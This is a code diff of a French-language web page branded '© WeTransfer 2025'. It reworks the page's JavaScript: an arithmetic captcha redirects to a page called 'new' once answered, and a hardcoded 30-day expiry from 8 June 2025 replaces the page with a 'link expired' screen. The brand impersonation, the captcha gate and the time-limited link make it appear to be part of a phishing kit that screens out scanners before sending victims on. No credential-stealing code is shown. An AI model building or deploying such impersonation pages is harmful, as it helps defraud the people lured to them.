@@ -1,9 +1,4 @@
-<?php 
-session_start();
-$_SESSION['authorized'] = "0";
-// Bonne pratique : régénérer l'ID de session pour éviter la fixation
-session_regenerate_id(true);
-?>
+
 <!DOCTYPE html>
 <html lang="fr">
 <head>
@@ -146,52 +141,48 @@ session_regenerate_id(true);
     <div class="footer">© WeTransfer 2025</div>
   </div>
 
-  <script>
-    let expectedAnswer;
+ 
+<script>
+let expectedAnswer;
 
-    function generateCaptcha() {
-      const num1 = Math.floor(Math.random() * 10) + 1;
-      const num2 = Math.floor(Math.random() * 10) + 1;
-      expectedAnswer = num1 + num2;
-      const label = document.getElementById('captcha-question');
-      label.textContent = `Combien font ${num1} + ${num2} ?`;
-    }
+// Génère une addition simple
+function generateCaptcha() {
+  const num1 = Math.floor(Math.random() * 10) + 1;
+  const num2 = Math.floor(Math.random() * 10) + 1;
+  expectedAnswer = num1 + num2;
+  const label = document.getElementById('captcha-question');
+  label.textContent = `Combien font ${num1} + ${num2} ?`;
+}
 
-    function onSubmit(e) {
-      e.preventDefault();
-      const input = document.getElementById('captcha-answer');
-      const userAnswer = parseInt(input.value.trim(), 10);
-      const error = document.getElementById('error-message');
-      const loading = document.getElementById('loading');
+// Vérifie la réponse
+function onSubmit(e) {
+  e.preventDefault();
+  const input = document.getElementById('captcha-answer');
+  const userAnswer = parseInt(input.value.trim(), 10);
+  const error = document.getElementById('error-message');
+  const loading = document.getElementById('loading');
 
-      if (userAnswer === expectedAnswer) {
-        error.style.display = "none";
-        loading.style.display = "block";
+  if (userAnswer === expectedAnswer) {
+    error.style.display = "none";
+    loading.style.display = "block";
 
-        // Simule un délai de chargement
-        setTimeout(() => {
-		 localStorage.setItem('valide', 'true');
-          window.location.href = "new";
-        }, 1000);
-      } else {
-        error.textContent = "Réponse incorrecte. Veuillez réessayer.";
-        error.style.display = "block";
-        generateCaptcha();
-        input.value = "";
-      }
-    }
-
-    window.onload = generateCaptcha;
-  </script>
- <script>
-// Date de début : 8 juin 2025
-const startDate = new Date('2025-06-08T00:00:00');
-
-// Délai d’expiration en jours
-const expirationDays = 30;
+    // Simule un délai de chargement
+    setTimeout(() => {
+      localStorage.setItem('valide', 'true');
+      window.location.href = "new";
+    }, 1000);
+  } else {
+    error.textContent = "Réponse incorrecte. Veuillez réessayer.";
+    error.style.display = "block";
+    generateCaptcha();
+    input.value = "";
+  }
+}
 
 // Vérifie si le lien a expiré
 function isLinkExpired() {
+  const startDate = new Date('2025-06-08T00:00:00');
+  const expirationDays = 30;
   const now = new Date();
   const timeDiff = now - startDate;
   const daysPassed = timeDiff / (1000 * 60 * 60 * 24);
@@ -200,51 +191,51 @@ function isLinkExpired() {
 
 // Affiche un message d’expiration avec style percutant
 function showExpirationMessage() {
-  if (isLinkExpired()) {
-    // Supprimer tout le contenu de la page
-    document.body.innerHTML = '';
+  document.body.innerHTML = '';
 
-    // Créer le conteneur du message
-    const messageDiv = document.createElement('div');
-    messageDiv.innerHTML = `
-      <h1>⚠️ Le lien a expiré</h1>
-      <p>Veuillez contacter l’administrateur du site pour plus d’informations.</p>
-    `;
+  const messageDiv = document.createElement('div');
+  messageDiv.innerHTML = `
+    <h1>⚠️ Le lien a expiré</h1>
+    <p>Veuillez contacter l’administrateur du site pour plus d’informations.</p>
+  `;
 
-    // Style impactant
-    Object.assign(messageDiv.style, {
-      position: 'fixed',
-      top: '0',
-      left: '0',
-      width: '100vw',
-      height: '100vh',
-      display: 'flex',
-      flexDirection: 'column',
-      justifyContent: 'center',
-      alignItems: 'center',
-      backgroundColor: '#1a1a1a',
-      color: '#ff4d4f',
-      fontFamily: 'Segoe UI, Arial, sans-serif',
-      fontSize: '24px',
-      textAlign: 'center',
-      padding: '40px',
-      boxSizing: 'border-box',
-      zIndex: '9999',
-    });
+  Object.assign(messageDiv.style, {
+    position: 'fixed',
+    top: '0',
+    left: '0',
+    width: '100vw',
+    height: '100vh',
+    display: 'flex',
+    flexDirection: 'column',
+    justifyContent: 'center',
+    alignItems: 'center',
+    backgroundColor: '#1a1a1a',
+    color: '#ff4d4f',
+    fontFamily: 'Segoe UI, Arial, sans-serif',
+    fontSize: '24px',
+    textAlign: 'center',
+    padding: '40px',
+    boxSizing: 'border-box',
+    zIndex: '9999',
+  });
 
-    // Style du titre
-    messageDiv.querySelector('h1').style.fontSize = '36px';
-    messageDiv.querySelector('h1').style.marginBottom = '20px';
-    messageDiv.querySelector('p').style.color = '#ffffff';
+  messageDiv.querySelector('h1').style.fontSize = '36px';
+  messageDiv.querySelector('h1').style.marginBottom = '20px';
+  messageDiv.querySelector('p').style.color = '#ffffff';
 
-    // Afficher sur la page
-    document.body.appendChild(messageDiv);
-  }
+  document.body.appendChild(messageDiv);
 }
 
-// Lancer au chargement de la page
-window.onload = showExpirationMessage;
+// Combiner tout au chargement
+window.onload = function () {
+  if (isLinkExpired()) {
+    showExpirationMessage();
+  } else {
+    generateCaptcha();
+  }
+};
 </script>
+
 
 </body>
 </html>
